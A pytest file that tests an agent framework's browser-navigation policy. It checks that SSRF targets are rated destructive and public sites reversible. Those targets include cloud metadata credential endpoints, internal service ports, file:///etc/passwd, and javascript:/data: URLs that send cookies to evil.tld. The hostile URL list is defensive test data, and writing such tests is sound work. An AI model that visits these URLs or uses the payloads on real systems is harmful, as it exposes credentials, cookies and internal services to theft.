"""Browser SSRF/internal/scheme classifier hardening (Phase 15).

Content-independent impact_of asserts (the Rule-of-Two blanket would mask a bug
in the injected corpus). Parametrized over BOTH browser_navigate and
safari_open_url — safari_open_url was previously absent from the branch.
"""
from __future__ import annotations

import pytest

from aether.core.policy import Policy, PolicyConfig
from aether.tools.registry import ToolSpec

_TOOLS = {
    name: ToolSpec(name=name, json_schema={}, permission="network",
                   impact="reversible", description="", handler=lambda a, c: "")
    for name in ("browser_navigate", "safari_open_url")
}

DANGEROUS_URLS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://100.100.100.200/latest/meta-data/",        # no is_* property → explicit set
    "http://127.0.0.1:2375/containers/json",
    "http://[::1]:9200/_cluster/settings",
    "http://localhost:6379/",
    "http://0.0.0.0:5000/",
    "http://192.168.1.1/setup.cgi?exfil=1",
    "http://10.0.0.5:8500/v1/kv/?recurse",
    "http://172.16.5.4/admin",
    "file:///etc/passwd",
    "javascript:fetch('https://evil.tld/x?c='+document.cookie)",
    "data:text/html,<script>fetch('https://evil.tld/')</script>",
]
BENIGN_URLS = [
    "https://www.google.com",
    "https://en.wikipedia.org/wiki/Cat",
    "https://apple.com/",
    "https://developer.apple.com/documentation",
]


@pytest.fixture
def policy():
    return Policy(PolicyConfig(careful=False))


@pytest.mark.parametrize("tool", ["browser_navigate", "safari_open_url"])
@pytest.mark.parametrize("url", DANGEROUS_URLS)
def test_dangerous_url_caught(policy, tool, url):
    assert policy.impact_of(_TOOLS[tool], {"url": url}) == "destructive", f"{tool} {url}"


@pytest.mark.parametrize("tool", ["browser_navigate", "safari_open_url"])
@pytest.mark.parametrize("url", BENIGN_URLS)
def test_public_url_not_over_blocked(policy, tool, url):
    assert policy.impact_of(_TOOLS[tool], {"url": url}) == "reversible", f"{tool} {url}"


def test_localhost_allowlist_override():
    # explicit opt-in re-enables a dangerous host for dev workflows
    p = Policy(PolicyConfig(careful=False, network_allowlist=["localhost"]))
    nav = _TOOLS["browser_navigate"]
    assert p.impact_of(nav, {"url": "http://localhost:3000/"}) == "reversible"
    # but a non-allowlisted internal host is still destructive
    assert p.impact_of(nav, {"url": "http://169.254.169.254/"}) == "destructive"
